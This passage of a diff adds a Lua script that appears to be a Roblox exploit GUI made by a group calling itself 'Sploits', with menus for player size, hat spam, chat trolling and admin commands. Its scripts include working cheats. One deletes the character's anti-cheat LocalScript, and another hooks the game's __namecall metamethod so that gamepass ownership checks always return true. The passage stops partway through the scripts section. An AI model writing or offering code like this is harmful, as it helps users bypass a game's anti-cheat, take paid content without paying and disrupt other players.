@@ -1,0 +1,6709 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local TO = Instance.new("ScreenGui")
+local Pages = Instance.new("Frame")
+local TryOnAnims = Instance.new("Frame")
+local Hub = Instance.new("Frame")
+local UIGridLayout = Instance.new("UIGridLayout")
+local UIPadding = Instance.new("UIPadding")
+local zSize = Instance.new("TextButton")
+local OpenClose = Instance.new("TextLabel")
+local Hub_2 = Instance.new("Frame")
+local cNormal = Instance.new("TextButton")
+local bGiant = Instance.new("TextButton")
+local aSuperGiant = Instance.new("TextButton")
+local UIGridLayout_2 = Instance.new("UIGridLayout")
+local UIPadding_2 = Instance.new("UIPadding")
+local BypassAntiCheat = Instance.new("TextButton")
+local Gamepass = Instance.new("TextButton")
+local Tools = Instance.new("TextButton")
+local Rainbow = Instance.new("Frame")
+local Name = Instance.new("TextLabel")
+local CloseOpen = Instance.new("TextButton")
+local HatSpam = Instance.new("Frame")
+local Hub_3 = Instance.new("Frame")
+local UIGridLayout_3 = Instance.new("UIGridLayout")
+local UIPadding_3 = Instance.new("UIPadding")
+local AntiLag = Instance.new("TextButton")
+local DropHats = Instance.new("TextButton")
+local Spam1 = Instance.new("TextButton")
+local Spam2 = Instance.new("TextButton")
+local Rainbow_2 = Instance.new("Frame")
+local Name_2 = Instance.new("TextLabel")
+local CloseOpen_2 = Instance.new("TextButton")
+local Fun = Instance.new("Frame")
+local Hub_4 = Instance.new("Frame")
+local UIGridLayout_4 = Instance.new("UIGridLayout")
+local UIPadding_4 = Instance.new("UIPadding")
+local Admin = Instance.new("TextButton")
+local ChatLag = Instance.new("TextButton")
+local ChatTroll = Instance.new("TextButton")
+local NeptunainV = Instance.new("TextButton")
+local Rainbow_3 = Instance.new("Frame")
+local Name_3 = Instance.new("TextLabel")
+local CloseOpen_3 = Instance.new("TextButton")
+local Credits = Instance.new("Frame")
+local Hub_5 = Instance.new("Frame")
+local UIGridLayout_5 = Instance.new("UIGridLayout")
+local UIPadding_5 = Instance.new("UIPadding")
+local ADiscord = Instance.new("TextButton")
+local GuiBy = Instance.new("TextLabel")
+local DesignBy = Instance.new("TextLabel")
+local ScriptBy = Instance.new("TextLabel")
+local Rainbow_4 = Instance.new("Frame")
+local Name_4 = Instance.new("TextLabel")
+local CloseOpen_4 = Instance.new("TextButton")
+local info = Instance.new("TextLabel")
+
+--Properties:
+
+TO.Name = "TO"
+TO.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+TO.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Pages.Name = "Pages"
+Pages.Parent = TO
+Pages.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Pages.BackgroundTransparency = 1.000
+Pages.Size = UDim2.new(0, 100, 0, 100)
+Pages.ZIndex = 1000000000
+
+TryOnAnims.Name = "TryOnAnims"
+TryOnAnims.Parent = Pages
+TryOnAnims.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+TryOnAnims.Position = UDim2.new(2.18000007, 0, 0.140000001, 0)
+TryOnAnims.Size = UDim2.new(0, 195, 0, 30)
+
+Hub.Name = "Hub"
+Hub.Parent = TryOnAnims
+Hub.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Hub.Position = UDim2.new(0, 0, 1.06666672, 0)
+Hub.Size = UDim2.new(0, 195, 0, 124)
+
+UIGridLayout.Parent = Hub
+UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout.CellSize = UDim2.new(0, 180, 0, 25)
+
+UIPadding.Parent = Hub
+UIPadding.PaddingBottom = UDim.new(0, 5)
+UIPadding.PaddingLeft = UDim.new(0, 5)
+UIPadding.PaddingRight = UDim.new(0, 5)
+UIPadding.PaddingTop = UDim.new(0, 5)
+
+zSize.Name = "zSize"
+zSize.Parent = Hub
+zSize.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+zSize.BorderColor3 = Color3.fromRGB(0, 0, 0)
+zSize.Position = UDim2.new(1.69589746, 0, -0.00786516443, 0)
+zSize.Size = UDim2.new(0, 200, 0, 50)
+zSize.Font = Enum.Font.SourceSansSemibold
+zSize.Text = "Player Size"
+zSize.TextColor3 = Color3.fromRGB(255, 255, 255)
+zSize.TextSize = 17.000
+
+OpenClose.Name = "Open/Close"
+OpenClose.Parent = zSize
+OpenClose.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OpenClose.BackgroundTransparency = 1.000
+OpenClose.Position = UDim2.new(0.855108678, 0, 0, 0)
+OpenClose.Size = UDim2.new(0, 25, 0, 25)
+OpenClose.Font = Enum.Font.SourceSansBold
+OpenClose.Text = "+"
+OpenClose.TextColor3 = Color3.fromRGB(255, 255, 255)
+OpenClose.TextSize = 17.000
+OpenClose.TextWrapped = true
+
+Hub_2.Name = "Hub"
+Hub_2.Parent = zSize
+Hub_2.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Hub_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Hub_2.Position = UDim2.new(0, 0, 1, 0)
+Hub_2.Size = UDim2.new(0, 180, 0, 94)
+Hub_2.Visible = false
+Hub_2.ZIndex = 1000000000
+
+cNormal.Name = "cNormal"
+cNormal.Parent = Hub_2
+cNormal.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+cNormal.BorderColor3 = Color3.fromRGB(0, 0, 0)
+cNormal.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+cNormal.Size = UDim2.new(0, 200, 0, 50)
+cNormal.Font = Enum.Font.SourceSansSemibold
+cNormal.Text = "Normal"
+cNormal.TextColor3 = Color3.fromRGB(255, 255, 255)
+cNormal.TextSize = 14.000
+
+bGiant.Name = "bGiant"
+bGiant.Parent = Hub_2
+bGiant.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+bGiant.BorderColor3 = Color3.fromRGB(0, 0, 0)
+bGiant.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+bGiant.Size = UDim2.new(0, 200, 0, 50)
+bGiant.Font = Enum.Font.SourceSansSemibold
+bGiant.Text = "Giant"
+bGiant.TextColor3 = Color3.fromRGB(255, 255, 255)
+bGiant.TextSize = 14.000
+
+aSuperGiant.Name = "aSuperGiant"
+aSuperGiant.Parent = Hub_2
+aSuperGiant.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+aSuperGiant.BorderColor3 = Color3.fromRGB(0, 0, 0)
+aSuperGiant.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+aSuperGiant.Size = UDim2.new(0, 200, 0, 50)
+aSuperGiant.Font = Enum.Font.SourceSansSemibold
+aSuperGiant.Text = "Super Giant"
+aSuperGiant.TextColor3 = Color3.fromRGB(255, 255, 255)
+aSuperGiant.TextSize = 14.000
+
+UIGridLayout_2.Parent = Hub_2
+UIGridLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout_2.CellSize = UDim2.new(0, 170, 0, 25)
+
+UIPadding_2.Parent = Hub_2
+UIPadding_2.PaddingBottom = UDim.new(0, 5)
+UIPadding_2.PaddingLeft = UDim.new(0, 5)
+UIPadding_2.PaddingRight = UDim.new(0, 5)
+UIPadding_2.PaddingTop = UDim.new(0, 5)
+
+BypassAntiCheat.Name = "BypassAntiCheat"
+BypassAntiCheat.Parent = Hub
+BypassAntiCheat.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+BypassAntiCheat.BorderColor3 = Color3.fromRGB(0, 0, 0)
+BypassAntiCheat.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+BypassAntiCheat.Size = UDim2.new(0, 200, 0, 50)
+BypassAntiCheat.Font = Enum.Font.SourceSansSemibold
+BypassAntiCheat.Text = "Bypass Anti Cheat"
+BypassAntiCheat.TextColor3 = Color3.fromRGB(255, 255, 255)
+BypassAntiCheat.TextSize = 17.000
+
+Gamepass.Name = "Gamepass"
+Gamepass.Parent = Hub
+Gamepass.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Gamepass.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Gamepass.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+Gamepass.Size = UDim2.new(0, 200, 0, 50)
+Gamepass.Font = Enum.Font.SourceSansSemibold
+Gamepass.Text = "Give All Gamepasses"
+Gamepass.TextColor3 = Color3.fromRGB(255, 255, 255)
+Gamepass.TextSize = 17.000
+
+Tools.Name = "Tools"
+Tools.Parent = Hub
+Tools.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Tools.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Tools.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+Tools.Size = UDim2.new(0, 200, 0, 50)
+Tools.Font = Enum.Font.SourceSansSemibold
+Tools.Text = "Give All Tools"
+Tools.TextColor3 = Color3.fromRGB(255, 255, 255)
+Tools.TextSize = 17.000
+
+Rainbow.Name = "Rainbow"
+Rainbow.Parent = TryOnAnims
+Rainbow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Rainbow.BorderSizePixel = 0
+Rainbow.Position = UDim2.new(0, 0, 1, 0)
+Rainbow.Size = UDim2.new(0, 195, 0, 2)
+
+Name.Name = "Name"
+Name.Parent = TryOnAnims
+Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Name.BackgroundTransparency = 1.000
+Name.Position = UDim2.new(0.189225882, 0, 0, 0)
+Name.Size = UDim2.new(0, 120, 0, 30)
+Name.Font = Enum.Font.SourceSansSemibold
+Name.Text = "TryOnAnimations"
+Name.TextColor3 = Color3.fromRGB(255, 255, 255)
+Name.TextScaled = true
+Name.TextSize = 14.000
+Name.TextWrapped = true
+
+CloseOpen.Name = "Close/Open"
+CloseOpen.Parent = TryOnAnims
+CloseOpen.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen.BackgroundTransparency = 1.000
+CloseOpen.Position = UDim2.new(0.843177199, 0, 0, 0)
+CloseOpen.Size = UDim2.new(0, 30, 0, 30)
+CloseOpen.Font = Enum.Font.SourceSans
+CloseOpen.Text = "-"
+CloseOpen.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen.TextScaled = true
+CloseOpen.TextSize = 14.000
+CloseOpen.TextWrapped = true
+
+HatSpam.Name = "HatSpam"
+HatSpam.Parent = Pages
+HatSpam.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+HatSpam.Position = UDim2.new(4.44999981, 0, 0.140000001, 0)
+HatSpam.Size = UDim2.new(0, 195, 0, 30)
+
+Hub_3.Name = "Hub"
+Hub_3.Parent = HatSpam
+Hub_3.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Hub_3.Position = UDim2.new(0, 0, 1.06666672, 0)
+Hub_3.Size = UDim2.new(0, 195, 0, 124)
+
+UIGridLayout_3.Parent = Hub_3
+UIGridLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout_3.CellSize = UDim2.new(0, 180, 0, 25)
+
+UIPadding_3.Parent = Hub_3
+UIPadding_3.PaddingBottom = UDim.new(0, 5)
+UIPadding_3.PaddingLeft = UDim.new(0, 5)
+UIPadding_3.PaddingRight = UDim.new(0, 5)
+UIPadding_3.PaddingTop = UDim.new(0, 5)
+
+AntiLag.Name = "AntiLag"
+AntiLag.Parent = Hub_3
+AntiLag.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+AntiLag.BorderColor3 = Color3.fromRGB(0, 0, 0)
+AntiLag.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+AntiLag.Size = UDim2.new(0, 200, 0, 50)
+AntiLag.Font = Enum.Font.SourceSansSemibold
+AntiLag.Text = "Client Anti Lag"
+AntiLag.TextColor3 = Color3.fromRGB(255, 255, 255)
+AntiLag.TextSize = 17.000
+
+DropHats.Name = "DropHats"
+DropHats.Parent = Hub_3
+DropHats.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+DropHats.BorderColor3 = Color3.fromRGB(0, 0, 0)
+DropHats.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+DropHats.Size = UDim2.new(0, 200, 0, 50)
+DropHats.Font = Enum.Font.SourceSansSemibold
+DropHats.Text = "Drop Hats"
+DropHats.TextColor3 = Color3.fromRGB(255, 255, 255)
+DropHats.TextSize = 17.000
+
+Spam1.Name = "Spam1"
+Spam1.Parent = Hub_3
+Spam1.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Spam1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Spam1.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+Spam1.Size = UDim2.new(0, 200, 0, 50)
+Spam1.Font = Enum.Font.SourceSansSemibold
+Spam1.Text = "Spam1"
+Spam1.TextColor3 = Color3.fromRGB(255, 255, 255)
+Spam1.TextSize = 17.000
+
+Spam2.Name = "Spam2"
+Spam2.Parent = Hub_3
+Spam2.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Spam2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Spam2.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+Spam2.Size = UDim2.new(0, 200, 0, 50)
+Spam2.Font = Enum.Font.SourceSansSemibold
+Spam2.Text = "Spam2"
+Spam2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Spam2.TextSize = 17.000
+
+Rainbow_2.Name = "Rainbow"
+Rainbow_2.Parent = HatSpam
+Rainbow_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Rainbow_2.BorderSizePixel = 0
+Rainbow_2.Position = UDim2.new(0, 0, 1, 0)
+Rainbow_2.Size = UDim2.new(0, 195, 0, 2)
+
+Name_2.Name = "Name"
+Name_2.Parent = HatSpam
+Name_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Name_2.BackgroundTransparency = 1.000
+Name_2.Position = UDim2.new(0.189225882, 0, 0, 0)
+Name_2.Size = UDim2.new(0, 120, 0, 30)
+Name_2.Font = Enum.Font.SourceSansSemibold
+Name_2.Text = "Hat Spam"
+Name_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Name_2.TextScaled = true
+Name_2.TextSize = 14.000
+Name_2.TextWrapped = true
+
+CloseOpen_2.Name = "Close/Open"
+CloseOpen_2.Parent = HatSpam
+CloseOpen_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen_2.BackgroundTransparency = 1.000
+CloseOpen_2.Position = UDim2.new(0.843177199, 0, 0, 0)
+CloseOpen_2.Size = UDim2.new(0, 30, 0, 30)
+CloseOpen_2.Font = Enum.Font.SourceSans
+CloseOpen_2.Text = "-"
+CloseOpen_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen_2.TextScaled = true
+CloseOpen_2.TextSize = 14.000
+CloseOpen_2.TextWrapped = true
+
+Fun.Name = "Fun"
+Fun.Parent = Pages
+Fun.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Fun.Position = UDim2.new(6.71000004, 0, 0.140000001, 0)
+Fun.Size = UDim2.new(0, 195, 0, 30)
+
+Hub_4.Name = "Hub"
+Hub_4.Parent = Fun
+Hub_4.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Hub_4.Position = UDim2.new(0, 0, 1.06666672, 0)
+Hub_4.Size = UDim2.new(0, 195, 0, 124)
+
+UIGridLayout_4.Parent = Hub_4
+UIGridLayout_4.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout_4.CellSize = UDim2.new(0, 180, 0, 25)
+
+UIPadding_4.Parent = Hub_4
+UIPadding_4.PaddingBottom = UDim.new(0, 5)
+UIPadding_4.PaddingLeft = UDim.new(0, 5)
+UIPadding_4.PaddingRight = UDim.new(0, 5)
+UIPadding_4.PaddingTop = UDim.new(0, 5)
+
+Admin.Name = "Admin"
+Admin.Parent = Hub_4
+Admin.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Admin.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Admin.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+Admin.Size = UDim2.new(0, 200, 0, 50)
+Admin.Font = Enum.Font.SourceSansSemibold
+Admin.Text = "Admin Commands"
+Admin.TextColor3 = Color3.fromRGB(255, 255, 255)
+Admin.TextSize = 17.000
+
+ChatLag.Name = "ChatLag"
+ChatLag.Parent = Hub_4
+ChatLag.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+ChatLag.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ChatLag.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+ChatLag.Size = UDim2.new(0, 200, 0, 50)
+ChatLag.Font = Enum.Font.SourceSansSemibold
+ChatLag.Text = "Fake Chat Lag"
+ChatLag.TextColor3 = Color3.fromRGB(255, 255, 255)
+ChatLag.TextSize = 17.000
+
+ChatTroll.Name = "ChatTroll"
+ChatTroll.Parent = Hub_4
+ChatTroll.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+ChatTroll.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ChatTroll.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+ChatTroll.Size = UDim2.new(0, 200, 0, 50)
+ChatTroll.Font = Enum.Font.SourceSansSemibold
+ChatTroll.Text = "Chat Troll"
+ChatTroll.TextColor3 = Color3.fromRGB(255, 255, 255)
+ChatTroll.TextSize = 17.000
+
+NeptunainV.Name = "NeptunainV"
+NeptunainV.Parent = Hub_4
+NeptunainV.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+NeptunainV.BorderColor3 = Color3.fromRGB(0, 0, 0)
+NeptunainV.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+NeptunainV.Size = UDim2.new(0, 200, 0, 50)
+NeptunainV.Font = Enum.Font.SourceSansSemibold
+NeptunainV.Text = "Neptunian V"
+NeptunainV.TextColor3 = Color3.fromRGB(255, 255, 255)
+NeptunainV.TextSize = 17.000
+
+Rainbow_3.Name = "Rainbow"
+Rainbow_3.Parent = Fun
+Rainbow_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Rainbow_3.BorderSizePixel = 0
+Rainbow_3.Position = UDim2.new(0, 0, 1, 0)
+Rainbow_3.Size = UDim2.new(0, 195, 0, 2)
+
+Name_3.Name = "Name"
+Name_3.Parent = Fun
+Name_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Name_3.BackgroundTransparency = 1.000
+Name_3.Position = UDim2.new(0.189225882, 0, 0, 0)
+Name_3.Size = UDim2.new(0, 120, 0, 30)
+Name_3.Font = Enum.Font.SourceSansSemibold
+Name_3.Text = "Fun"
+Name_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+Name_3.TextScaled = true
+Name_3.TextSize = 14.000
+Name_3.TextWrapped = true
+
+CloseOpen_3.Name = "Close/Open"
+CloseOpen_3.Parent = Fun
+CloseOpen_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen_3.BackgroundTransparency = 1.000
+CloseOpen_3.Position = UDim2.new(0.843177199, 0, 0, 0)
+CloseOpen_3.Size = UDim2.new(0, 30, 0, 30)
+CloseOpen_3.Font = Enum.Font.SourceSans
+CloseOpen_3.Text = "-"
+CloseOpen_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen_3.TextScaled = true
+CloseOpen_3.TextSize = 14.000
+CloseOpen_3.TextWrapped = true
+
+Credits.Name = "Credits"
+Credits.Parent = Pages
+Credits.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Credits.Position = UDim2.new(8.97000027, 0, 0.140000001, 0)
+Credits.Size = UDim2.new(0, 195, 0, 30)
+
+Hub_5.Name = "Hub"
+Hub_5.Parent = Credits
+Hub_5.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Hub_5.Position = UDim2.new(0, 0, 1.06666672, 0)
+Hub_5.Size = UDim2.new(0, 195, 0, 175)
+
+UIGridLayout_5.Parent = Hub_5
+UIGridLayout_5.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout_5.CellSize = UDim2.new(0, 180, 0, 25)
+
+UIPadding_5.Parent = Hub_5
+UIPadding_5.PaddingBottom = UDim.new(0, 5)
+UIPadding_5.PaddingLeft = UDim.new(0, 5)
+UIPadding_5.PaddingRight = UDim.new(0, 5)
+UIPadding_5.PaddingTop = UDim.new(0, 5)
+
+ADiscord.Name = "ADiscord"
+ADiscord.Parent = Hub_5
+ADiscord.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+ADiscord.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ADiscord.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+ADiscord.Size = UDim2.new(0, 200, 0, 50)
+ADiscord.Font = Enum.Font.SourceSansSemibold
+ADiscord.Text = "Copy Discord"
+ADiscord.TextColor3 = Color3.fromRGB(255, 255, 255)
+ADiscord.TextSize = 17.000
+
+GuiBy.Name = "GuiBy"
+GuiBy.Parent = Hub_5
+GuiBy.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+GuiBy.BorderColor3 = Color3.fromRGB(0, 0, 0)
+GuiBy.Size = UDim2.new(0, 200, 0, 50)
+GuiBy.Font = Enum.Font.SourceSansSemibold
+GuiBy.Text = "Gui by Nem&AtKn Sploits™"
+GuiBy.TextColor3 = Color3.fromRGB(255, 255, 255)
+GuiBy.TextSize = 17.000
+
+DesignBy.Name = "DesignBy"
+DesignBy.Parent = Hub_5
+DesignBy.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+DesignBy.BorderColor3 = Color3.fromRGB(0, 0, 0)
+DesignBy.Size = UDim2.new(0, 200, 0, 50)
+DesignBy.Font = Enum.Font.SourceSansSemibold
+DesignBy.Text = "Design by Nemsploits™"
+DesignBy.TextColor3 = Color3.fromRGB(255, 255, 255)
+DesignBy.TextSize = 17.000
+
+ScriptBy.Name = "ScriptBy"
+ScriptBy.Parent = Hub_5
+ScriptBy.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+ScriptBy.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScriptBy.Size = UDim2.new(0, 200, 0, 50)
+ScriptBy.Font = Enum.Font.SourceSansSemibold
+ScriptBy.Text = "Script by Nem&AtKn Sploits™ and OnlySploits™"
+ScriptBy.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScriptBy.TextSize = 12.000
+ScriptBy.TextWrapped = true
+
+Rainbow_4.Name = "Rainbow"
+Rainbow_4.Parent = Credits
+Rainbow_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Rainbow_4.BorderSizePixel = 0
+Rainbow_4.Position = UDim2.new(0, 0, 1, 0)
+Rainbow_4.Size = UDim2.new(0, 195, 0, 2)
+
+Name_4.Name = "Name"
+Name_4.Parent = Credits
+Name_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Name_4.BackgroundTransparency = 1.000
+Name_4.Position = UDim2.new(0.189225882, 0, 0, 0)
+Name_4.Size = UDim2.new(0, 120, 0, 30)
+Name_4.Font = Enum.Font.SourceSansSemibold
+Name_4.Text = "Credits"
+Name_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+Name_4.TextScaled = true
+Name_4.TextSize = 14.000
+Name_4.TextWrapped = true
+
+CloseOpen_4.Name = "Close/Open"
+CloseOpen_4.Parent = Credits
+CloseOpen_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen_4.BackgroundTransparency = 1.000
+CloseOpen_4.Position = UDim2.new(0.843177199, 0, 0, 0)
+CloseOpen_4.Size = UDim2.new(0, 30, 0, 30)
+CloseOpen_4.Font = Enum.Font.SourceSans
+CloseOpen_4.Text = "-"
+CloseOpen_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen_4.TextScaled = true
+CloseOpen_4.TextSize = 14.000
+CloseOpen_4.TextWrapped = true
+
+info.Name = "info"
+info.Parent = Credits
+info.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+info.BackgroundTransparency = 1.000
+info.BorderColor3 = Color3.fromRGB(0, 0, 0)
+info.Position = UDim2.new(0.0342598148, 0, 5.2102561, 0)
+info.Size = UDim2.new(0, 180, 0, 45)
+info.Font = Enum.Font.SourceSansSemibold
+info.Text = "[!] Press insert to open and close the gui."
+info.TextColor3 = Color3.fromRGB(255, 255, 255)
+info.TextScaled = true
+info.TextSize = 14.000
+info.TextWrapped = true
+
+-- Scripts:
+
+local function EUBB_fake_script() -- Pages.Toggle 
+	local script = Instance.new('LocalScript', Pages)
+
+	function PopupGui()
+	if script.Parent.Visible==true then script.Parent.Visible=false
+	else script.Parent.Visible=true
+	end
+	end
+	
+	
+	game:GetService("UserInputService").InputBegan:Connect(function(key)
+	if key.KeyCode==Enum.KeyCode.Insert then
+	PopupGui()
+	end
+	end)
+end
+coroutine.wrap(EUBB_fake_script)()
+local function AVVEK_fake_script() -- zSize.Script 
+	local script = Instance.new('Script', zSize)
+
+	_G.Material = "Wood"
+	_G.ITERS = 1
+	local button = script.Parent
+	local hub = button.Hub
+	local label = button["Open/Close"]
+	
+	button.MouseButton1Click:Connect(function()
+	if hub.Visible==true then label.Text="+" hub.Visible=false
+	else hub.Visible=true label.Text="-"
+	end
+	end)
+end
+coroutine.wrap(AVVEK_fake_script)()
+local function PZSO_fake_script() -- cNormal.Script 
+	local script = Instance.new('Script', cNormal)
+
+	local button = script.Parent
+	local hub = script.Parent.Parent
+	local label = script.Parent.Parent.Parent["Open/Close"]
+	local mlabel = script.Parent.Parent.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local args = {
+			[1] = game:GetService("Players").LocalPlayer,
+		}
+		
+		game:GetService("ReplicatedStorage").Normal:FireServer(unpack(args))
+		hub.Visible = false
+		label.Text = "+"
+		mlabel.Text = "Normal"
+	end)
+end
+coroutine.wrap(PZSO_fake_script)()
+local function ZPJQXAL_fake_script() -- bGiant.Script 
+	local script = Instance.new('Script', bGiant)
+
+	local button = script.Parent
+	local hub = script.Parent.Parent
+	local label = script.Parent.Parent.Parent["Open/Close"]
+	local mlabel = script.Parent.Parent.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local args = {
+			[1] = game:GetService("Players").LocalPlayer,
+		}
+		
+		game:GetService("ReplicatedStorage").Giant:FireServer(unpack(args))
+		hub.Visible = false
+		label.Text = "+"
+		mlabel.Text = "Giant"
+	end)
+end
+coroutine.wrap(ZPJQXAL_fake_script)()
+local function QYEJYT_fake_script() -- aSuperGiant.Script 
+	local script = Instance.new('Script', aSuperGiant)
+
+	local button = script.Parent
+	local hub = script.Parent.Parent
+	local label = script.Parent.Parent.Parent["Open/Close"]
+	local mlabel = script.Parent.Parent.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local args = {
+			[1] = game:GetService("Players").LocalPlayer,
+		}
+		
+		game:GetService("ReplicatedStorage").SuperGiant:FireServer(unpack(args))
+		hub.Visible = false
+		label.Text = "+"
+		mlabel.Text = "SuperGiant"
+	end)
+end
+coroutine.wrap(QYEJYT_fake_script)()
+local function QYZJRYT_fake_script() -- BypassAntiCheat.Script 
+	local script = Instance.new('Script', BypassAntiCheat)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	game.Players.LocalPlayer.CharacterAdded:Connect(function()
+	    wait(2)
+	    game:GetService("Players").LocalPlayer.Character.LocalScript:Destroy()
+	print("AntiCheat Bypassed!")
+	end)
+	wait(0.5)
+	game.Players.LocalPlayer.Character.Humanoid.Health = 0
+	end)
+end
+coroutine.wrap(QYZJRYT_fake_script)()
+local function AZUOWU_fake_script() -- BypassAntiCheat.Message 
+	local script = Instance.new('LocalScript', BypassAntiCheat)
+
+	local StarterGui = game:GetService("StarterGui")
+	
+	local Notifications = {
+		"Notification Message 1",
+	}
+	
+	local TimeBetweenNotifications = 5 --REPLACE 5 WITH THE NUMBER OF SECONDS YOU WANT TO WAIT IN BETWEEN NOTIFICATIONS APPEARING
+	
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	wait(2)
+	for i = 1, #Notifications do
+		local Notification = Notifications[i]
+			
+		StarterGui:SetCore("SendNotification", {
+			Title = "Anti Cheat";
+			Text = "Anti Cheat Bypassed!";
+			Duration = 7;
+		})
+			
+		wait(TimeBetweenNotifications)
+	end
+	end)
+end
+coroutine.wrap(AZUOWU_fake_script)()
+local function SFQZTR_fake_script() -- Gamepass.Script 
+	local script = Instance.new('Script', Gamepass)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	local mt = getrawmetatable(game)
+	make_writeable(mt)
+	
+	local namecall = mt.__namecall
+	
+	mt.__namecall = newcclosure(function(self, ...)
+	local method = getnamecallmethod()
+	local args = {...}
+	
+	if method == "UserOwnsGamePassAsync" then
+	return true
+	end
+	
+	return namecall(self, ...)
+	end)
+	wait(0.5)
+	game.Players.LocalPlayer.Character.Humanoid.Health = 0
+	end)
+end
+coroutine.wrap(SFQZTR_fake_script)()
+local function GICJS_fake_script() -- Gamepass.Message 
+	local script = Instance.new('LocalScript', Gamepass)
+
+	local StarterGui = game:GetService("StarterGui")
+	
+	local Notifications = {
+		"Notification Message 1",
+	}
+	
+	local TimeBetweenNotifications = 5 --REPLACE 5 WITH THE NUMBER OF SECONDS YOU WANT TO WAIT IN BETWEEN NOTIFICATIONS APPEARING
+	
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	for i = 1, #Notifications do
+		local Notification = Notifications[i]
+			
+		StarterGui:SetCore("SendNotification", {
+			Title = "Gamepass";
+			Text = "Succesfuly obitained gamepasses!";
+			Duration = 7;
+		})
+			
+		wait(TimeBetweenNotifications)
+	end
+	end)
+end
+coroutine.wrap(GICJS_fake_script)()
+local function CMIIFN_fake_script() -- Tools.Script 
